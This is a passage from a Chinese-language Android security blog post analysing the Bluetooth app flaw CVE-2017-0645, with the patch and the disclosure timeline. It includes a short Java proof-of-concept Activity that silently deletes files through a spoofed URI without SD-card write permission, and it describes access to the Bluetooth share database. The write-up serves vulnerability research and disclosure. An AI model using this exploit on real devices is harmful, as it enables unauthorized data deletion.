<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FakeViewActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">static</span> String TAG = <span class="string">&quot;Bluz&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line"></span><br><span class="line">        Intent intent = getIntent();</span><br><span class="line">        String dir = intent.getDataString();</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;dir is &quot;</span>+dir);</span><br><span class="line">        Uri uri = intent.getData();</span><br><span class="line">        ContentResolver cr = getContentResolver();</span><br><span class="line">       Log.d(TAG, <span class="string">&quot;Deleting &quot;</span>+ intent.getDataString() +<span class="string">&quot; silently!&quot;</span>);</span><br><span class="line">        getContentResolver().delete(uri, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在上述整个过程中，恶意 App 并未申请 SD 卡写权限，因此这是一个提权漏洞。</p>
<p>另外还有一种利用方式，是在 Intent 中直接传入蓝牙 BluetoothOppProvider 的 uri ，比如 content://com.android.bluetooth.opp/btopp/1” ，从而获得对蓝牙共享数据库的读写权限。</p>
<p>完整代码请见<a target="_blank" rel="noopener" href="https://github.com/heeeeen/CVE-PoC/tree/master/CVE-2017-0645">这里</a></p>
<h3 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h3><p>Google 对该漏洞的<a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/packages/apps/Bluetooth/+/14b7d7e1537af60b7bca6c7b9e55df0dc7c6bf41%5E%21/#F0">修复</a>主要有两点:</p>
<p>1.确保 Intent data 始终为 BluetoothOppProvider 的 Uri ，防止仿冒； 2.撤销了授予第三方应用的读写权限，只授予第三方应用某个 Activity 的读权限。</p>
<h3 id="0x05-时间线-1"><a href="#0x05-时间线-1" class="headerlink" title="0x05 时间线"></a>0x05 时间线</h3><pre><code>2017.02.15: 漏洞提交
2017.03.01: 漏洞确认，初始评级为高
2017.03.23: 漏洞降级为中
2017.06.01: 补丁发布
2017.06.23: 漏洞公开
</code></pre>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Android%E6%BC%8F%E6%B4%9E/" rel="tag"># Android漏洞</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2016/06/08/Android%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97%E4%B9%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E4%B8%83-%E2%80%93IDA%E8%B0%83%E8%AF%95so%E6%96%87%E4%BB%B6-%E4%B8%8B/" rel="prev" title="Android逆向系列之动态调试-七-–IDA调试so文件-下">
      <i class="fa fa-chevron-left"></i> Android逆向系列之动态调试-七-–IDA调试so文件-下
    </a></div>
      <div class="post-nav-item">
    <a href="/2018/10/01/%E6%87%92%E4%BA%BA%E7%A6%8F%E5%88%A9-%E4%B8%80%E7%A7%92%E5%88%9B%E5%BB%BAXposed%E6%A8%A1%E7%89%88/" rel="next" title="懒人福利-一秒创建Xposed模版">
      懒人福利-一秒创建Xposed模版 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%93%9D%E7%89%99App%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97%E5%88%86%E6%9E%90%E4%B9%8B%E4%B8%80CVE-2017-0601"><span class="nav-number">1.</span> <span class="nav-text">蓝牙App漏洞系列分析之一CVE-2017-0601</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E6%A6%82%E8%A6%81"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 概要</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95"><span class="nav-number">1.4.</span> <span class="nav-text">0x04 测试方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-%E4%BF%AE%E5%A4%8D"><span class="nav-number">1.5.</span> <span class="nav-text">0x05 修复</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-%E6%97%B6%E9%97%B4%E7%BA%BF"><span class="nav-number">1.6.</span> <span class="nav-text">0x06 时间线</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%93%9D%E7%89%99App%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97%E5%88%86%E6%9E%90%E4%B9%8B%E4%BA%8CCVE-2017-0639"><span class="nav-number">2.</span> <span class="nav-text">蓝牙App漏洞系列分析之二CVE-2017-0639</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-number">2.1.</span> <span class="nav-text">0x01 漏洞简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E7%BC%98%E8%B5%B7"><span class="nav-number">2.2.</span> <span class="nav-text">0x02 漏洞缘起</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-%E6%94%BB%E5%87%BB%E9%9D%A2%E2%80%94%E2%80%94%E8%93%9D%E7%89%99%E7%9A%84%E4%BF%A1%E6%81%AF%E5%88%86%E4%BA%AB"><span class="nav-number">2.3.</span> <span class="nav-text">0x03 攻击面——蓝牙的信息分享</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%88%86%E6%9E%90"><span class="nav-number">2.4.</span> <span class="nav-text">0x04 进一步分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-%E6%97%B6%E9%97%B4%E7%BA%BF"><span class="nav-number">2.5.</span> <span class="nav-text">0x05 时间线</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%93%9D%E7%89%99App%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97%E5%88%86%E6%9E%90%E4%B9%8B%E4%B8%89CVE-2017-0645"><span class="nav-number">3.</span> <span class="nav-text">蓝牙App漏洞系列分析之三CVE-2017-0645</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-1"><span class="nav-number">3.1.</span> <span class="nav-text">0x01 漏洞简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="nav-number">3.2.</span> <span class="nav-text">0x02 漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="nav-number">3.3.</span> <span class="nav-text">0x03 漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">3.4.</span> <span class="nav-text">0x04 漏洞修复</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-%E6%97%B6%E9%97%B4%E7%BA%BF-1"><span class="nav-number">3.5.</span> <span class="nav-text">0x05 时间线</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Tasfa</p>
  <div class="site-description" itemprop="description">AndroidSecurity</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">21</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Tasfa</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
